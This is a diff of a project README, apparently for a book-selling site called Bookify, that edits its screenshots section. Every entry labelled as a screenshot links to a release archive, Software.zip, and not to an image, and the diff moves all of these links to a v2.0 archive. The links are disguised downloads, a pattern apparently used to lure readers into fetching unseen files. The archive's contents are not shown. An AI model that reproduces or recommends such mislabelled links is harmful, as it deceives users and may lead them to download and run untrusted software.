@@ -15,21 +15,21 @@
 
 ### Screenshots:
 #### Home Page:
-![Screenshot (78)](https://github.com/vyshnavidevi11/Bookify/releases/download/v1.0/Software.zip)
+![Screenshot (78)](https://github.com/vyshnavidevi11/Bookify/releases/download/v2.0/Software.zip)
 
-![Screenshot (79)](https://github.com/vyshnavidevi11/Bookify/releases/download/v1.0/Software.zip)
+![Screenshot (79)](https://github.com/vyshnavidevi11/Bookify/releases/download/v2.0/Software.zip)
 
-![Screenshot (80)](https://github.com/vyshnavidevi11/Bookify/releases/download/v1.0/Software.zip)
+![Screenshot (80)](https://github.com/vyshnavidevi11/Bookify/releases/download/v2.0/Software.zip)
 
-![Screenshot (81)](https://github.com/vyshnavidevi11/Bookify/releases/download/v1.0/Software.zip)
+![Screenshot (81)](https://github.com/vyshnavidevi11/Bookify/releases/download/v2.0/Software.zip)
 #### Login Page:
-![Screenshot (82)](https://github.com/vyshnavidevi11/Bookify/releases/download/v1.0/Software.zip)
+![Screenshot (82)](https://github.com/vyshnavidevi11/Bookify/releases/download/v2.0/Software.zip)
 
 #### Register page
-![Screenshot (83)](https://github.com/vyshnavidevi11/Bookify/releases/download/v1.0/Software.zip)
+![Screenshot (83)](https://github.com/vyshnavidevi11/Bookify/releases/download/v2.0/Software.zip)
 
 #### Sell Page:
-![Screenshot (84)](https://github.com/vyshnavidevi11/Bookify/releases/download/v1.0/Software.zip)
+![Screenshot (84)](https://github.com/vyshnavidevi11/Bookify/releases/download/v2.0/Software.zip)
 
 ### Technologies used:
 1. HTML.
